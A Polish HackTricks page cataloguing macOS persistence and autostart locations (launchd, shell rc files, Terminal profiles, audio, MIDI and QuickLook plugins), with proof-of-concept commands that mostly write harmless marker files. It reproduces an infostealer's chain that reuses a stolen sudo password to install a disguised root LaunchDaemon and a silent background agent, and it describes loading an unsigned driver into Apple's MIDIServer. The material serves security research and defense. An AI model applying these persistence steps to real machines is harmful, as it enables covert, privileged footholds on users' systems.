# Automatyczne uruchamianie w macOS

{{#include ../banners/hacktricks-training.md}}

Ta sekcja w dużej mierze bazuje na serii wpisów na blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Jej celem jest wskazanie lokalizacji, w których zapis pliku może prowadzić do późniejszego wykonania kodu, zdarzenia wyzwalającego wykonanie oraz wymaganych uprawnień. Sama obecność danej lokalizacji nie dowodzi, że mechanizm jest włączony. Opisane niżej lokalne kontrole przeprowadzono w macOS 26.5.2 (5 października 2026 r.); nie potwierdzają one zachowania w każdej wersji macOS.

> [!NOTE]
> „Wyzwalane zapisem” nie zawsze oznacza „uruchamiane natychmiast po zapisie”. Niektóre lokalizacje są odczytywane dopiero podczas logowania, uruchamiania konkretnej aplikacji lub wykonywania przez użytkownika określonej czynności. Zapis do modyfikowalnego payloadu w już skonfigurowanym zadaniu to coś innego niż uprawnienie do zarejestrowania nowego zadania. Zanim polegniesz na danej technice, przetestuj ją na koncie tymczasowym lub w VM.

## Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **zaczekanie** na bardzo **częstą** **czynność**, określoną **ilość czasu** lub **czynność, którą zwykle można wykonać** z poziomu sandboxa bez uprawnień root.

### Launchd

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
  - **Wyzwalacz**: Logowanie użytkownika (lub jawna rejestracja)
  - Wymagane uprawnienia root
- **`/Library/LaunchDaemons`**
  - **Wyzwalacz**: Uruchomienie systemu (lub jawna rejestracja)
  - Wymagane uprawnienia root
- **`/System/Library/LaunchAgents`**
  - **Wyzwalacz**: Logowanie użytkownika; chroniona lokalizacja systemowa Apple
- **`/System/Library/LaunchDaemons`**
  - **Wyzwalacz**: Uruchomienie systemu; chroniona lokalizacja systemowa Apple
- **`~/Library/LaunchAgents`**
  - **Wyzwalacz**: Ponowne zalogowanie

`launchd` nie skanuje lokalizacji `~/Library/LaunchDaemons`. Zadania użytkownika powinny znajdować się w `~/Library/LaunchAgents`; systemowy katalog daemonów to `/Library/LaunchDaemons`. [Przewodnik Apple dotyczący uruchamiania launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) opisuje skanowane lokalizacje.

> [!TIP]
> Ciekawostka: **`launchd`** ma wbudowaną property list w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Ponadto usługi te mogą zawierać klucze `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą zostać uruchomione i zakończyć działanie pomyślnie.
>
> Oczywiście nie można jej zmodyfikować ze względu na code signing.

#### Opis i wykorzystanie

**`launchd`** to **pierwszy** **proces** uruchamiany przez kernel OX S podczas startu i ostatni kończący działanie podczas zamykania systemu. Jego **PID** powinien zawsze wynosić **1**. Proces ten **odczytuje i wykonuje** konfiguracje wskazane w **plistach** **ASEP** w lokalizacjach:

- `/Library/LaunchAgents`: Agenty użytkowników zainstalowane przez administratora
- `/Library/LaunchDaemons`: Daemony systemowe zainstalowane przez administratora
- `/System/Library/LaunchAgents`: Agenty użytkowników dostarczane przez Apple.
- `/System/Library/LaunchDaemons`: Daemony systemowe dostarczane przez Apple.

Gdy użytkownik się loguje, `launchd` ładuje plisty z `~/Library/LaunchAgents` tego użytkownika, używając jego uprawnień. Zadania są uruchamiane zgodnie z ich kluczami; samo załadowanie plisty nie oznacza natychmiastowego uruchomienia procesu.

**Główna różnica między agentami a daemonami polega na tym, że agenty są ładowane, gdy użytkownik się loguje, a daemony — podczas uruchamiania systemu** (ponieważ niektóre usługi, takie jak ssh, muszą zostać uruchomione, zanim jakikolwiek użytkownik uzyska dostęp do systemu). Agenty mogą też korzystać z GUI, natomiast daemony muszą działać w tle.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Każdy element `ProgramArguments` jest osobnym argumentem; `launchd` nie interpretuje pojedynczego ciągu znaków jako polecenia powłoki. Poprawny przykład powyżej można sprawdzić pod kątem składni bez jego wczytywania, używając `plutil -lint /path/to/example.plist`. Więcej informacji znajdziesz w lokalnej stronie podręcznika `man launchd.plist`, w sekcjach `ProgramArguments`, `RunAtLoad` i `KeepAlive`.

#### Wyzwalacze zdarzeń plikowych w istniejących zadaniach

**Już wczytany** agent lub demon może używać `WatchPaths`, aby uruchamiać się po zmianie wskazanej ścieżki. `QueueDirectories` uruchamia zadanie, gdy katalog nie jest pusty; `StartOnMount` uruchamia je po zamontowaniu woluminu. [Przewodnik Apple dotyczący launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) zawiera przykłady użycia `WatchPaths` i `QueueDirectories`. Zapis do obserwowanego pliku wyzwala **już skonfigurowane zadanie**; umożliwia dowolne wykonanie kodu tylko wtedy, gdy zapisujący może również kontrolować plik wykonywalny, skrypt lub dane interpretowane przez to zadanie. Samo zapisanie nowego pliku plist poza skanowaną lub zarejestrowaną lokalizacją nie powoduje jego wczytania.

Ten PoC z automatycznym czyszczeniem rejestruje **tymczasowego agenta użytkownika** o unikatowej nazwie, modyfikuje wyłącznie obserwowany przez niego plik, a następnie usuwa agenta. Został pomyślnie uruchomiony w systemie macOS 26.5.2 bez wylogowywania się ani ponownego uruchamiania:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lokalne uruchomienie wypisało `watch fired: True`, a `bootout` zakończyło się powodzeniem. `launchctl bootstrap` jest tu używane wyłącznie w ramach odizolowanego PoC; nie jest potrzebne w przypadku zadania, które jest już załadowane. Aby bezpiecznie ocenić istniejące zadanie, odczytaj jego plik plist i rozwiązaną ścieżkę `ProgramArguments`, a następnie sprawdź, czy odpowiedni plik wykonywalny lub interpretowany jest zapisywalny, nie modyfikując go.

Zdarza się, że **agent musi zostać uruchomiony przed zalogowaniem użytkownika**; takie agenty nazywają się **PreLoginAgents**. Są one na przykład przydatne do udostępniania technologii asystujących podczas logowania. Można je znaleźć również w `/Library/LaunchAgents` (przykład znajduje się [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Nowe pliki konfiguracyjne Daemonów lub Agentów zostaną **załadowane po następnym ponownym uruchomieniu lub za pomocą** `launchctl load <target.plist>`. Można **również załadować pliki .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak takie pliki plist nie zostaną automatycznie załadowane po ponownym uruchomieniu).\
> Można je również **wyładować** za pomocą `launchctl unload <target.plist>` (wskazywany przez nie proces zostanie zakończony),
>
> Aby **upewnić się**, że **nic** (na przykład nadpisanie) **nie uniemożliwia** **uruchomienia** **Agenta** lub **Daemonu**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Wyświetl wszystkich agentów i demony załadowane przez bieżącego użytkownika:

```bash
launchctl list
```

#### Przykładowy złośliwy łańcuch LaunchDaemon (ponowne użycie hasła)

Niedawny macOS infostealer ponownie wykorzystał **przechwycone hasło sudo**, aby utworzyć user agent i LaunchDaemon działający z uprawnieniami root:<sup>[[1]](#references)</sup>

- Zapisz pętlę agenta w `~/.agent` i nadaj jej uprawnienia do wykonywania.
- Wygeneruj plist w `/tmp/starter`, wskazujący na tego agenta.
- Ponownie wykorzystaj skradzione hasło z `sudo -S`, aby skopiować plik do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić właściciela `root:wheel` i załadować go poleceniem `launchctl load`.
- Uruchom agenta po cichu za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plist demona umieszczony w `/Library/LaunchDaemons` nie staje się bezpieczny tylko dlatego, że jego właścicielem jest użytkownik. `launchd` wymaga odpowiedniego właściciela i uprawnień dla zadań systemowych i może odrzucić niezabezpieczony plist. Demon, którego właścicielem jest root, zwykle działa jako root, chyba że jego konfiguracja wskazuje inne konto. Sprawdź `UserName`, `GroupName`, właściciela zadania i diagnostykę `launchctl`; nie wnioskuj o tożsamości procesu wyłącznie na podstawie nazwy właściciela plista.

#### Więcej informacji o launchd

**`launchd`** to **pierwszy** proces w trybie użytkownika uruchamiany przez **kernel**. Proces musi uruchomić się **pomyślnie** i **nie może się zakończyć ani ulec awarii**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi procesy**.

Jedną z pierwszych rzeczy, które robi `launchd`, jest **uruchamianie** wszystkich **daemonów**, takich jak:

- **Daemony timerowe** uruchamiane o określonych porach:
  - `com.apple.atrun.plist` uruchamia `/usr/libexec/atrun` z `StartInterval = 30` sekund w macOS 26.5.2; jego efektywny stan włączenia może różnić się od wartości klucza `Disabled` w pliku plist, ponieważ launchd przechowuje nadpisania osobno.
  - `com.vix.cron.plist` uruchamia `/usr/sbin/cron`, gdy `/usr/lib/cron/tabs` zawiera zadania. `com.apple.systemstats.daily` to inna zaplanowana usługa, a nie daemon cron.
- **Daemony sieciowe**, takie jak:
  - `org.cups.cups-lpd`: nasłuchuje przez TCP (`SockType: stream`) z `SockServiceName: printer`
    - SockServiceName musi być portem lub usługą z `/etc/services`
  - `com.apple.xscertd.plist`: nasłuchuje przez TCP na porcie 1640
- **Daemony ścieżek**, uruchamiane po zmianie określonej ścieżki:
  - `com.apple.postfix.master`: sprawdza ścieżkę `/etc/postfix/aliases`
- **Daemony powiadomień IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach:**
  - `com.apple.xscertd-helper.plist`: wpis `MachServices` wskazuje nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Różni się od poprzedniego elementu. Powoduje, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenia. Jednak w tym przypadku głównym zaangażowanym plikiem binarnym nie jest `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on wtyczki z folderu chronionego przez SIP `/System/Library/UserEventPlugins/`, w którym każda wtyczka wskazuje swój inicjalizator w kluczu `XPCEventModuleInitializer` lub — w przypadku starszych wtyczek — w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w pliku `Info.plist`.

### pliki startowe powłoki

Opis: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Opis (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Trzeba jednak znaleźć aplikację z obejściem TCC, która uruchamia powłokę wczytującą te pliki

#### Lokalizacje

- **`~/.zshenv`** (lub nowszy skompilowany plik **`~/.zshenv.zwc`**)
  - **Wyzwalacz**: Każde zwykłe wywołanie zsh, w tym nieinteraktywne `zsh -c`; `zsh -f` pomija pliki startowe użytkownika.
- **`~/.zshrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Wyzwalacz**: Uruchomienie logowania zsh; pliki te są odczytywane odpowiednio przed i po `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Wyzwalacz**: Otwarcie terminala z zsh
  - Wymagany root
- **`~/.zlogout`**
  - **Wyzwalacz**: Normalne zakończenie logowania zsh, nie każde zamknięcie terminala lub powłoki.
- **`/etc/zlogout`**
  - **Wyzwalacz**: Zamknięcie terminala z zsh
  - Wymagany root
- Potencjalnie więcej informacji w: **`man zsh`**
- **`~/.bashrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego Bash bez logowania. Interaktywny Bash z logowaniem odczytuje ten plik tylko wtedy, gdy plik logowania jawnie go dołącza.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Wyzwalacz**: Uruchomienie Bash z logowaniem; uruchamiany jest pierwszy istniejący plik z tej kolejności, do którego jest dostęp. `~/.profile` jest pomijany, jeśli istnieje którykolwiek z dwóch wcześniejszych plików.
- **`/etc/profile`**
  - **Wyzwalacz**: Uruchomienie Bash z logowaniem; jego modyfikacja wymaga uprawnień root.
- **`~/.tcshrc`** lub, jeśli go nie ma, **`~/.cshrc`**
  - **Wyzwalacz**: Uruchomienie `tcsh`, w tym nieinteraktywnego `tcsh -c` na tym Macu. Użytkownik musi faktycznie uruchomić `tcsh`; nie jest to domyślna powłoka macOS.
- **`~/.login`**
  - **Wyzwalacz**: Uruchomienie logowania `tcsh` po jego pliku rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Wyzwalacz**: Powinny uruchamiać się wraz z xterm, ale **nie jest on zainstalowany**, a nawet po instalacji pojawia się ten błąd: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i wykorzystanie

Podczas inicjowania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. Obecnie domyślną powłoką w macOS jest `/bin/zsh`. To, czy Terminal lub SSH uruchamia powłokę logowania albo interaktywną, zależy od ich konfiguracji; nie zakładaj, że każda sesja uruchamia wszystkie wymienione pliki. `bash` i `sh` są również dostępne w macOS, ale trzeba je jawnie uruchomić.<sup>[[2]](#references)</sup> [Dokumentacja plików startowych zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) opisuje kolejność, nadpisanie `ZDOTDIR` oraz regułę dotyczącą `.zwc`.

Poniższy eksperyment tylko do odczytu wykorzystał tymczasowy `ZDOTDIR` w macOS 26.5.2. Pokazuje, które pliki użytkownika zostały odczytane; żaden rzeczywisty plik startowy powłoki nie został zmieniony:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Zaobserwowana kolejność: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` musi już wskazywać alternatywny katalog; samo zapisanie plików w dowolnym katalogu nie wystarczy.

[Dokumentacja startowa Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) rozróżnia powłoki logowania od interaktywnych. Na maszynie testowej z macOS 26.5.2 odizolowany `HOME` zawierający wszystkie cztery pliki startowe użytkownika dał następujące wyniki: `bash -c` → żaden, `bash -ic` → `.bashrc`, `bash -lc` i `bash -lic` → tylko `.bash_profile`. Po usunięciu `.bash_profile` Bash logowania odczytał `.bash_login`, a po usunięciu również tego pliku — `.profile`. `BASH_ENV` może wskazywać plik dla nieinteraktywnego Basha, ale ta zmienna środowiskowa musi już być ustawiona w procesie wywołującym. Jawne `exit` w Bashu logowania może również wczytać `~/.bash_logout`.

Lokalna dokumentacja `tcsh(1)` opisuje odrębną kolejność plików startowych. Przy użyciu tymczasowego `HOME` polecenie `/bin/tcsh -c :` odczytało `.tcshrc` albo `.cshrc`, jeśli `.tcshrc` nie istniał. Tymczasowa powłoka logowania `tcsh` odczytała `.tcshrc` i `.login`. Te testy utworzyły i usunęły wyłącznie pliki tymczasowe.

### Ponowne otwieranie aplikacji

> [!CAUTION]
> W testach skonfigurowanie wskazanego mechanizmu exploitation, wylogowanie się i ponowne zalogowanie, a nawet ponowne uruchomienie systemu nie spowodowało uruchomienia aplikacji. Aplikacja może wymagać uruchomienia podczas wykonywania tych czynności.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Wyzwalacz**: Ponowne uruchomienie powodujące ponowne otwarcie aplikacji

#### Opis i exploitation

Wszystkie aplikacje, które mają zostać ponownie otwarte, znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Aby aplikacje otwierane ponownie uruchamiały Twoją aplikację, wystarczy **dodać ją do listy**.

UUID można znaleźć, wyświetlając zawartość tego katalogu albo używając polecenia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić, które aplikacje zostaną ponownie otwarte, możesz użyć:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Aby **dodać aplikację do tej listy**, możesz użyć:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferencje Terminala

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal zwykle ma uprawnienia FDA użytkownika, który go uruchamia

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Wyzwalacz**: Otwarcie nowego okna lub karty Terminala przy użyciu profilu, którego ustawienia Shell zawierają polecenie startowe

#### Opis i wykorzystanie

W **`~/Library/Preferences`** przechowywane są preferencje użytkownika dotyczące aplikacji. Niektóre z tych preferencji mogą zawierać konfigurację umożliwiającą **uruchamianie innych aplikacji/skryptów**.<sup>[[5]](#references)</sup>

Na przykład Terminal może wykonać polecenie podczas uruchamiania:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Jeśli odpowiedni profil zawiera polecenie startowe, a Terminal odczytuje to ustawienie, nowa sesja korzystająca z tego profilu może je wykonać. [Aktualny przewodnik Apple dotyczący Terminala](https://support.apple.com/guide/terminal/trmlshll/mac) opisuje polecenie **Powłoka → Uruchamianie** dla poszczególnych profili. Samo otwarcie Terminala bez uruchomienia nowej sesji korzystającej z tego profilu nie wystarczy. Poniższe zmiany ustawień **nie zostały wprowadzone** na Macu badawczym.

Możesz dodać to z CLI za pomocą:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Skrypty Terminala / Inne rozszerzenia plików

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal może korzystać z uprawnień FDA użytkownika, który go używa

#### Lokalizacja

- **Dowolne miejsce**
  - **Wyzwalacz**: Otwórz konkretny plik `.terminal`, `.command` lub `.tool`

#### Opis i wykorzystanie

Jeśli użytkownik otworzy plik ustawień **`.terminal`**, Terminal może utworzyć sesję na podstawie jego profilu; wykonywalne pliki **`.command`** i **`.tool`** również można otwierać w Terminalu. Jest to jawne wyzwolenie przez otwarcie pliku, a nie wykonanie wynikające z samego otwarcia Terminala. Odziedziczony dostęp TCC zależy od faktycznie przyznanych uprawnień Terminala i podjętej operacji. Poniższy historyczny przykład nie został uruchomiony na Macu używanym do badań.

Wypróbuj to za pomocą:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Można też użyć rozszerzeń **`.command`**, **`.tool`** wraz ze zwykłą zawartością skryptów shell — takie pliki również zostaną otwarte przez Terminal.

> [!CAUTION]
> Jeśli Terminal ma **Full Disk Access**, będzie mógł wykonać tę czynność (pamiętaj, że wykonywane polecenie będzie widoczne w oknie Terminala).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
  - Wymagane uprawnienia root
  - **Trigger**: serwer Core Audio ładuje zgodny plug-in urządzenia HAL; ponowne uruchomienie serwera może spowodować ponowne wykrycie
- **`/Library/Audio/Plug-ins/Components`**
  - Wymagane uprawnienia root
  - **Trigger**: host audio wykrywa i tworzy instancję zainstalowanego Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: host audio wykrywa i tworzy instancję zainstalowanego Audio Unit
- **`/System/Library/Components`**
  - Lokalizacja chroniona przez system, zawierająca komponenty dostarczone przez Apple
  - **Trigger**: host audio tworzy instancję pasującego komponentu systemowego

#### Description

Według wcześniejszych writeupów można **skompilować niektóre audio plugins** i doprowadzić do ich załadowania.<sup>[[6]](#references)[[7]](#references)</sup>

Plug-ins urządzeń HAL i Audio Units są ładowane na różne sposoby. [Przewodnik Apple dotyczący hostowania Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) mówi, że host musi znaleźć komponent i utworzyć jego instancję; samo skopiowanie go do katalogu skanowania lub ponowne uruchomienie `coreaudiod` nie dowodzi, że został wykonany. Plug-ins AUv2 działają w procesie hosta, natomiast [aktualne wytyczne Apple dotyczące Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) mówią, że AUv3 domyślnie działa w osobnym procesie w macOS. Wymagania dotyczące podpisu, sandbox i walidacji bibliotek zależą od hosta. Na badawczym Macu nie zainstalowano ani nie uruchomiono żadnego audio plug-inu.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Twój kod działa wewnątrz procesu `MIDIServer`, a nie w sandboxie Twojej aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` działa w ramach własnego profilu sandbox `seatbelt`

#### Location

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Nie są wymagane uprawnienia root (katalog z prawem zapisu dla użytkownika)
  - **Trigger**: `MIDIServer` uruchamia się ponownie. Jest uruchamiany na żądanie, gdy dowolny proces po raz pierwszy korzysta z CoreMIDI (po otwarciu *Audio MIDI Setup*, GarageBand, DAW lub strony korzystającej z WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Wymagane uprawnienia root
  - **Trigger**: jak wyżej

#### Description & Exploitation

`MIDIServer` firmy Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) ładuje bundlę MIDI **driverów** z katalogów `Audio/MIDI Drivers`. Plik binarny jest podpisany przez Apple, ale ma entitlement `com.apple.security.cs.disable-library-validation`, dzięki czemu załaduje bundlę **niepodpisaną lub podpisaną ad hoc przez inny zespół**, co umożliwia wykonanie kodu w osobnym procesie należącym do Apple **bez uprawnień root**.<sup>[[53]](#references)</sup>

Zweryfikowano na macOS 26 (tylko do odczytu):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Sterownik to standardowy bundle, który eksportuje fabrykę `MIDIDriverInterface`; umieszczenie payloadu w fabryce/konstruktorze powoduje jego uruchomienie, gdy tylko `MIDIServer` wyliczy sterowniki. Zbuduj go, umieść jako `~/Library/Audio/MIDI Drivers/Evil.plugin`, a następnie wywołaj jego załadowanie bez wylogowywania się ani ponownego uruchamiania:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Wtyczki QuickLook

Opis: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i wykorzystanie

Wtyczki QuickLook mogą zostać uruchomione, gdy **wywołasz podgląd pliku** (naciśniesz spację, gdy plik jest zaznaczony w Finderze) i zainstalowana jest **wtyczka obsługująca ten typ pliku**.<sup>[[8]](#references)</sup>

Możesz skompilować własną wtyczkę QuickLook, umieścić ją w jednej z powyższych lokalizacji, aby ją załadować, a następnie przejść do obsługiwanego pliku i nacisnąć spację, aby ją uruchomić.

